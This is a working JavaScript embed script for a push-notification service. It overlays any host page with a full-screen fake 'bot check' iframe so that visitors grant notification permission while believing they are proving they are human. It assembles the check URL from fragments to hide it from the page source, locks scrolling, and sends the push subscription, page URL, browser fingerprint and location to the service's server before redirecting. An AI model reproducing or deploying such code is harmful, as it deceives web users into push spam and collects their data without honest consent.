(function () {
  var cfg = window.PUSH_CONFIG || {};
  var appUrl = cfg.appUrl || 'https://pushlogin.com';

  // Already subscribed? skip
  var subKey = 'push-sub-' + (cfg.landingId || '');
  if (localStorage.getItem(subKey) === '1') return;

  // ── Build bot-check URL dynamically (not visible in source) ─────────────
  var _p = ['/landing', '/bot', '-check'].join('');
  var _q = '?embedded=true'
    + '&domain=' + encodeURIComponent(cfg.domain || '')
    + '&landingId=' + encodeURIComponent(cfg.landingId || '')
    + '&vapidKey=' + encodeURIComponent(cfg.vapidKey || '')
    + '&allowRedirect=' + encodeURIComponent((cfg.redirects && cfg.redirects.onAllow) || '')
    + '&blockRedirect=' + encodeURIComponent((cfg.redirects && cfg.redirects.onBlock) || '');
  var botCheckUrl = appUrl + _p + _q;

  // ── Create full-screen iframe loading real bot-check page ────────────────
  var iframe = document.createElement('iframe');
  iframe.src = botCheckUrl;
  iframe.setAttribute('allow', 'notifications');
  iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;border:none;background:#f0f2f5';
  document.body.appendChild(iframe);
  document.body.style.overflow = 'hidden';

  var isRequestingPermission = false;

  // ── Handle messages from bot-check iframe ────────────────────────────────
  window.addEventListener('message', function (e) {
    if (!e.data || !e.data.type) return;
    // Only accept messages from our platform
    if (e.origin !== appUrl) return;

    if (e.data.type === 'bot-check-verified') {
      // User clicked Allow — request permission on parent page (correct origin)
      handleAllow(e.data);
    } else if (e.data.type === 'request-permission-firefox') {
      // Firefox/Edge can't request permissions from iframe — parent must do it
      handleFirefoxEdge(e.data);
    } else if (e.data.type === 'bot-check-completed') {
      // Chrome/Safari: permission handled inside iframe, just clean up
      if (e.data.permission === 'granted') {
        cleanup();
        var dest = (cfg.redirects && cfg.redirects.onAllow) || null;
        if (dest) window.location.href = dest;
      } else {
        handleBlock();
      }
    }
  });

  function cleanup() {
    iframe.remove();
    document.body.style.overflow = '';
  }

  function handleBlock() {
    cleanup();
    var dest = (cfg.redirects && cfg.redirects.onBlock) || null;
    if (dest) window.location.href = dest;
  }

  function handleAllow(data) {
    if (Notification.permission === 'granted') {
      registerAndSubscribe(data);
      return;
    }
    if (Notification.permission === 'denied') {
      handleBlock();
      return;
    }
    Notification.requestPermission().then(function (permission) {
      if (permission === 'granted') {
        registerAndSubscribe(data);
      } else {
        handleBlock();
      }
    }).catch(function () { handleBlock(); });
  }

  function handleFirefoxEdge(data) {
    if (isRequestingPermission) return;
    isRequestingPermission = true;

    if (Notification.permission === 'denied') {
      handleBlock();
      isRequestingPermission = false;
      return;
    }
    if (Notification.permission === 'granted') {
      registerAndSubscribe(data);
      isRequestingPermission = false;
      return;
    }

    var isEdge = /edg/i.test(navigator.userAgent);
    if (isEdge) {
      handleBlock();
      isRequestingPermission = false;
      return;
    }

    var permResult;
    try {
      permResult = Notification.requestPermission();
    } catch (err) {
      // callback fallback
      Notification.requestPermission(function (p) {
        isRequestingPermission = false;
        if (p === 'granted') { registerAndSubscribe(data); } else { handleBlock(); }
      });
      return;
    }

    if (permResult && typeof permResult.then === 'function') {
      permResult.then(function (p) {
        isRequestingPermission = false;
        if (p === 'granted') { registerAndSubscribe(data); } else { handleBlock(); }
      }).catch(function () {
        isRequestingPermission = false;
        handleBlock();
      });
    } else {
      isRequestingPermission = false;
      if (permResult === 'granted') { registerAndSubscribe(data); } else { handleBlock(); }
    }
  }

  function registerAndSubscribe(data) {
    navigator.serviceWorker.register('/push-sw.js', { updateViaCache: 'none' })
      .then(function (reg) {
        return navigator.serviceWorker.ready.then(function () { return reg; });
      })
      .then(function (reg) {
        return reg.pushManager.getSubscription().then(function (existing) {
          if (existing) return existing;
          return reg.pushManager.subscribe({
            userVisibleOnly: true,
            applicationServerKey: urlBase64ToUint8Array(cfg.vapidKey)
          });
        });
      })
      .then(function (sub) {
        return sendToServer(sub, data);
      })
      .then(function () {
        localStorage.setItem(subKey, '1');
        cleanup();
        var dest = (cfg.redirects && cfg.redirects.onAllow) || null;
        if (dest) window.location.href = dest;
      })
      .catch(function (err) {
        console.error('[Push] Subscribe failed:', err);
        cleanup();
        var dest = (cfg.redirects && cfg.redirects.onAllow) || null;
        if (dest) window.location.href = dest;
      });
  }

  function sendToServer(sub, data) {
    var j = sub.toJSON();
    var bi = (data && data.browserInfo) || getBrowserInfo();
    return fetch(appUrl + '/api/clients', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        subscription: { endpoint: j.endpoint, keys: j.keys },
        landingId: cfg.landingId,
        domain: cfg.domain,
        url: window.location.href,
        accessStatus: 'allowed',
        browserInfo: bi,
        location: (data && data.location) || {}
      })
    });
  }

  function getBrowserInfo() {
    var ua = navigator.userAgent;
    var b = 'Unknown', o = 'Unknown';
    if (/Chrome/.test(ua) && !/Chromium|Edge|OPR/.test(ua)) b = 'Chrome';
    else if (/Firefox/.test(ua)) b = 'Firefox';
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) b = 'Safari';
    else if (/Edg/.test(ua)) b = 'Edge';
    else if (/OPR|Opera/.test(ua)) b = 'Opera';
    if (/Windows/.test(ua)) o = 'Windows';
    else if (/Mac/.test(ua)) o = 'macOS';
    else if (/Android/.test(ua)) o = 'Android';
    else if (/iPhone|iPad/.test(ua)) o = 'iOS';
    else if (/Linux/.test(ua)) o = 'Linux';
    return {
      browser: b, version: 'Unknown', os: o,
      userAgent: ua, language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      platform: navigator.platform || 'Unknown'
    };
  }

  function urlBase64ToUint8Array(b64) {
    var pad = '='.repeat((4 - b64.length % 4) % 4);
    var raw = atob((b64 + pad).replace(/-/g, '+').replace(/_/g, '/'));
    var arr = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
    return arr;
  }
})();
